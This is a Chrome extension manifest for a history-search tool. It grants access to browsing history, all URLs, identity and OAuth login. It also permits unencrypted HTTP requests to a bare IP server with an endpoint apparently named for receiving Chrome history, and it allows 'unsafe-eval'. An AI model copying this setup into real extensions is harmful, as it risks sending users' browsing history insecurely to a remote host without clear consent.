{
  "update_url": "https://clients2.google.com/service/update2/crx",
  "name": "Search History",
  "version": "2.1.2",
  "manifest_version": 2,
  "description": "Search Your Own History",
  "background": {
    "page": "background.html",
    "persistent": false
  },
  "icons": {
    "16": "h16.png",
    "48": "h48.png",
    "128": "h128.png"
  },
  "browser_action": {
    "default_icon": "h.png",
    "default_title": "H"
  },
  "content_security_policy": "script-src 'self' 'unsafe-eval'; object-src 'self'",
  "oauth2": {
    "client_id": "399405825466-ldip4jarqth0psajrudt0gdu47bm5ck6.apps.googleusercontent.com",
    "scopes": [
      "https://www.googleapis.com/auth/plus.login"
    ]
  },
  "permissions": [
    "tabs",
    "storage",
    "<all_urls>",
    "http://112.108.40.87:8080/SearcherServer/indexWrite.jsp",
    "http://112.108.40.87:8080/SearcherServer/ChromeHistory_input.jsp",
    "history",
    "http://code.jquery.com/",
    "https://accounts.google.com/*",
    "identity",
    "https://www.googleapis.com/*",
    "background"
  ]
}
